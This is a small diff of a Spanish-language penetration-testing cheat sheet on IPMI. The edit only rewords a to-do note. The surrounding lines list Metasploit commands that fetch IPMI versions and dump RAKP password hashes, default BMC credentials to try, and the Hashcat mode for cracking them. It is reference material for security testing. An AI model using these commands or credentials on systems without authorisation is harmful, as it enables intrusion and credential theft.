@@ -27,7 +27,7 @@ linked:
 | `msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <target>; run;"`    | Escanea la versión de IPMI usando Metasploit.                  |
 | `msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <target>; run;"` | Extrae hashes de contraseñas explotando un fallo en RAKP v2.0. |
 | `root:calvin``ADMIN:ADMIN`                                                              | Probar las siguientes credenciales por defecto.                |
-**Nota:** Usar el modo **Hashcat 7300** para crackear hashes RAKP. #porhacer:enlazar a hashcat.
+**Nota:** Usar el modo **Hashcat 7300** para crackear hashes RAKP. **TODO:** enlazar a hashcat.
 
 ***
 
